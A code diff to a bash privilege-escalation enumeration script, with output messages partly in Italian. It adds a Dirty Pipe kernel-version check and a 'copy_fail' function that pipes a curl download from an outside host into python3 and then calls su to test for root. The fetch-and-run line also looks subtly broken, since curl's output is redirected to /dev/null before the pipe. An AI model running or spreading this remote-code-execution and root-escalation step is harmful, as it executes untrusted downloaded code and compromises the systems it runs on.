@@ -1,7 +1,7 @@
 #!/bin/bash
 ####
 #### Authors: https://github.com/MS-0x404
-#### Version: 1.0 
+#### Version: 2.0 
 
 # Global Variables
 readonly -a cap_ignore_list=(
@@ -67,38 +67,20 @@ readonly -a kernel_list=(
     "2.6.9"
 )
 
+copy_fail() {
+    curl https://copy.fail/exp >/dev/null 2>&1 | python3 && su >/dev/null 2>&1
+    if [[ $(id -u) == 0 ]]; then
+        echo "[+] Vulnerabile Copy Fail!"
+    else
+        echo "[-] Non vulnerabile a Copy Fail!"
+    fi
+    
+}
 
 ## Logo Ascii 
 main_logo() {
 cat << 'EOF'
-    ________________________________________ 
-(                                        )
-(  Fry: Feels root, man.                 )
-    -------------------------------------------------- 
-      o
-        o
-          o  
-             ,'``.._   ,'``.
-            :,--._:)\,:,._,.:
-            :`--,''@@@:`...';\        
-             `,'@@@@@@@`---'@@`.     
-             /@@@@@@@@@@@@@@@@@:
-            /@@@@@@@@@@@@@@@@@@@\
-          ,'@@@@@@@@@@@@@@@@@@@@@:\.___,-.
-         `...,---'``````-..._@@@@|:@@@@@@@\
-           (                 )@@@;:@@@@)@@@\  _,-.
-            `.              (@@@//@@@@@@@@@@`'@@@@\
-             :               `.//@@)@@@@@@)@@@@@,@;
-             |`.            _,'/@@@@@@@)@@@@)@,'@,'
-             :`.`-..____..=:.-':@@@@@.@@@@@_,@@,'
-            ,'\ ``--....-)='    `._,@@\    )@@@'``._
-           /@_@`.       (@)      /@@@@@)  ; / \ \`-.'
-          (@@@`-:`.     `' ___..'@@_,-'   |/   `.)
-           `-. `.`.``-----``--,@@.'
-             |/`.\`'        ,',');
-                 `         (/  (/
-
-    Ricerca Privilege Escalation...
+    Searching for Privilege Escalation...
 
 EOF
 
@@ -246,6 +228,13 @@ kernel_priv() {
         echo "[-] Nessuna PrivEsc tramite Kernel"
         echo "  └─ Versione attuale: $current_kernel (controlla manualmente)"
     fi
+    if [[ "$(printf '%s\n' "5.8" "$current_kernel" "5.16.11" | sort -V | sed -n '2p')" == "$current_kernel" ]]; then
+        echo "[+] Vulnerabile a Dirty Pipe!"
+        echo "  └─ $current_kernel"
+    else
+        echo "[-] Non vulnerabile a Dirty Pipe!"
+        echo "  └─ $current_kernel"
+    fi
 }
 
 # Main Function
@@ -260,6 +249,7 @@ main() {
     cron_job
     sudo_esc
     kernel_priv
+    copy_fail
 }
 
 ## Inizialization
